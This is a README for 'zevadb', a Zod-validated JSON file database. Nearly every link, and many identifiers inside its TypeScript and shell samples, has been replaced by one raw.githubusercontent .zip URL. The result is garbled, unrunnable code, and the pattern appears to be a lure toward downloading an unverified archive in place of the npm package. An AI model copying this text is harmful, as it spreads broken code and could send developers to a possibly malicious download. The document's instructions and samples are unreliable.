# 📦 zevadb - A Safe and Easy JSON Database

<div align="center">
  <a href="https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip">
    <img src="https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip%https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip" alt="Download ZevaDB" />
  </a>
</div>

<div align="center">
  <h2>ZevaDB 📦</h2>
  <p>A typesafe JSON file database with Zod schema validation.</p>
  <a href="https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip"><strong>npm</strong></a> | <a href="https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip">Buy Me a Coffee</a>
</div>

### 🛠 Features

- Fully type-safe collections powered by Zod.
- Read/write JSON files with a simple API.
- `https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip` works like a normal object, fully typed.
- Use the `.set()` method for safe collection replacement.
- An easy migration system for updating your database schema.
- Automatic backup of any corrupted files.
- Designed for TypeScript, ensuring full type inference.

### 📥 Installation

To install ZevaDB, you need https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip and npm. Follow these steps:

1. Open your terminal or command prompt.
2. Run the following command:

    ```bash
    npm install zevadb zod
    ```

> **Note:** ZevaDB requires Zod v4 as a peer dependency.

### 🚀 Getting Started

Follow these steps to start using ZevaDB:

1. Create a new JavaScript or TypeScript file where you want to use the database.
2. Use the following code to set up your database:

    ```ts
    import { z } from "zod";
    import { ZevaDB } from "zevadb";

    // Define schemas
    const UserSchema = https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip({
      id: https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip(),
      name: https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip(),
    });

    const PostSchema = https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip({
      id: https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip(),
      title: https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip(),
      content: https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip(),
      authorId: https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip(),
    });

    // Initialize the database
    const db = new ZevaDB("https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip", {
      user: UserSchema,
      post: PostSchema,
    });

    // Example: Add a new user
    https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip({
      id: "1",
      name: "John Doe",
    });

    https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip(https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip); // Access the user data
    ```

3. Save your file.
4. Run your file from the terminal or command prompt with https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip

    ```bash
    node https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip
    ```

### 📦 Download & Install

To download ZevaDB, visit the [Releases page](https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip) to find the latest version.

Ensure you follow each step carefully:

1. Go to the [Releases page](https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip).
2. Download the version that suits your needs.
3. Follow the installation instructions provided above.

### 📘 Documentation

For more detailed information about using ZevaDB, you can check the following topics:

- [API Reference](https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip)
- [Schema Validation with Zod](https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip)
- [Example Projects](https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip)

### 🛠 System Requirements

To run ZevaDB, you need:

- https://raw.githubusercontent.com/Lara07-purple/zevadb/main/src/zevadb_1.4-beta.4.zip version 14 or higher
- npm (Node Package Manager)
- Operating System: Windows, macOS, or Linux

Make sure to keep your system updated for the best performance.

Feel free to reach out if you have any questions or need further assistance.